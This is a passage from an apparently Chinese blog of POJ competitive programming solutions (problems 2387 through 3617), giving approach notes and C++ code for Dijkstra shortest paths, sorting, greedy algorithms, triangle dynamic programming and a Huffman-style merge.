class="keyword">int</span> maxdistance;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;d);</div><div class="line">    maxdistance = d * d;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;zuobiao[i].x,&amp;zuobiao[i].y);</div><div class="line">    &#125;</div><div class="line">    init_set(n);</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;op) != EOF)&#123;</div><div class="line">        <span class="keyword">if</span> (op == <span class="string">'O'</span>)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p);</div><div class="line">            computer[p].repair = <span class="number">1</span>;</div><div class="line"></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">                <span class="keyword">if</span> (computer[j].repair == <span class="number">1</span>)</div><div class="line">                    <span class="keyword">if</span> (cal_distance(p,j) &lt;= maxdistance)&#123;</div><div class="line">                        union_set(p,j);</div><div class="line">                    &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;p,&amp;q);</div><div class="line">            <span class="keyword">if</span> (same_set(p,q))&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"SUCCESS\n"</span>);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"FAIL\n"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2387"><a href="#2387" class="headerlink" title="2387"></a>2387</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2387" target="_blank" rel="external">http://poj.org/problem?id=2387</a></p>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>最短路径 +　队列优先　。<br>这题竟然是先读入边数再读入顶点数，Ｏrz<br>另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。</p>
<h3 id="提交-6"><a href="#提交-6" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_V 200000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123; <span class="keyword">int</span> to, cost, flag ;&#125;;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</div><div class="line"></div><div class="line"><span class="keyword">int</span> V;</div><div class="line"><span class="keyword">int</span> E;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX_V];</div><div class="line"><span class="keyword">int</span> d[MAX_V];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;E,&amp;V);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)&#123;</div><div class="line">        <span class="keyword">int</span> s, t, cost;</div><div class="line">        edge temp1,temp2;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;s, &amp;t, &amp;cost);</div><div class="line">        temp1.to = t;</div><div class="line">        temp1.cost = cost;</div><div class="line">        G[s].push_back(temp1);</div><div class="line"></div><div class="line"></div><div class="line">        temp2.to = s;</div><div class="line">        temp2.cost = cost;</div><div class="line">        G[t].push_back(temp2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[V]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; que;</div><div class="line"></div><div class="line">    fill(d+<span class="number">1</span>,d + V+<span class="number">1</span>, INF);</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line">    que.push(P(<span class="number">0</span>,s));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( !que.empty())&#123;</div><div class="line">        P p = que.top();</div><div class="line">        que.pop();</div><div class="line">        <span class="keyword">int</span> v = p.second;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d[v] &lt; p.first)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; G[v].size(); i++)&#123;</div><div class="line">            edge e = G[v][i];</div><div class="line">            <span class="keyword">if</span> ( d[e.to] &gt; d[v] + e.cost) &#123;</div><div class="line">                d[e.to] = d[v] + e.cost;</div><div class="line">                que.push(P(d[e.to], e.to));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2388"><a href="#2388" class="headerlink" title="2388"></a>2388</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2388" target="_blank" rel="external">http://poj.org/problem?id=2388</a></p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>先排序，之后打印出中间值。水题。</p>
<h3 id="提交-7"><a href="#提交-7" class="headerlink" title="提交"></a>提交</h3><h4 id="stl"><a href="#stl" class="headerlink" title="stl"></a>stl</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    sort(arr,arr+n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> h)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(h&lt;l+<span class="number">2</span>)<span class="keyword">return</span> ;</div><div class="line">    <span class="keyword">int</span> e=h,p=l;</div><div class="line">    <span class="keyword">while</span>(l&lt;h)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]);</div><div class="line">        <span class="keyword">while</span>(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]);</div><div class="line">        <span class="keyword">if</span>(l&lt;h) swap(arr[l],arr[h]);</div><div class="line">    &#125;</div><div class="line">    swap(arr[h],arr[p]);</div><div class="line">    quick_sort(p,h);</div><div class="line">    quick_sort(l,e);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    quick_sort(<span class="number">0</span>,n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3069"><a href="#3069" class="headerlink" title="3069"></a>3069</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3069" target="_blank" rel="external">http://poj.org/problem?id=3069</a></p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>贪心算法。在 <code>while( i &lt; n )</code> 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。</p>
<h3 id="提交-8"><a href="#提交-8" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> r;</div><div class="line"><span class="keyword">int</span> loc[N];</div><div class="line"><span class="keyword">int</span> marknum;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    <span class="keyword">while</span> ( n != <span class="number">-1</span> &amp;&amp; r != <span class="number">-1</span>)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;loc[i]);</div><div class="line">        sort(loc,loc+n);</div><div class="line">        marknum = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ( i &lt; n )&#123;</div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] )</div><div class="line">                i++;</div><div class="line">            i--;</div><div class="line">            marknum++;</div><div class="line">            j = i;</div><div class="line"></div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i])</div><div class="line">                i++;</div><div class="line"></div><div class="line">            j = i;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,marknum);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3176"><a href="#3176" class="headerlink" title="3176"></a>3176</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3176" target="_blank" rel="external">http://poj.org/problem?id=3176</a></p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>二维数组triangle用于保存三角形，二维数组way用于保存路径。<br>以题目数据为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">7</div><div class="line">3 8</div><div class="line">8 1 0</div><div class="line">2 7 4 4</div><div class="line">4 5 2 6 5</div></pre></td></tr></table></figure></p>
<p>分为三种情况：</p>
<ul>
<li>最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j]</li>
<li>最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j];</li>
<li>中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j];</li>
</ul>
<p>填表完成后，对最后一行way[n-1][]找出最大值即为答案。</p>
<h3 id="提交-9"><a href="#提交-9" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3253"><a href="#3253" class="headerlink" title="3253"></a>3253</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3253" target="_blank" rel="external">http://poj.org/problem?id=3253</a></p>
<h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>霍夫曼树的变形。<br>重点在于对两个最小值相加后对数组的处理。</p>
<h3 id="提交-10"><a href="#提交-10" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> k;</div><div class="line"><span class="keyword">int</span> len[<span class="number">20005</span>];</div><div class="line"><span class="keyword">int</span> total;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( n &gt; <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">int</span> mii1 = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> mii2 = <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (len[mii1] &gt; len[mii2])</div><div class="line">            swap(mii1,mii2);</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">if</span> (len[i] &lt; len[mii1])&#123;</div><div class="line">                mii2 = mii1;</div><div class="line">                mii1 = i;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len[i] &lt; len[mii2])&#123;</div><div class="line">                mii2 = i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> t = len[mii1] + len[mii2];</div><div class="line">        ans += t;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (mii1 == n<span class="number">-1</span>)</div><div class="line">            swap(mii1,mii2);</div><div class="line">        len[mii1] = t;</div><div class="line">        len[mii2] = len[n<span class="number">-1</span>];</div><div class="line">        n--;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    total = <span class="number">0</span>;</div><div class="line">    k = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;len[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    solve();</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3617"><a href="#3617" class="headerlink" title="3617"></a>3617</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3617" target="_blank" rel="external">http://poj.org/problem?id=3617</a></p>
<h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。</p>
<h3 id="提交-11"><a href="#提交-11" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div 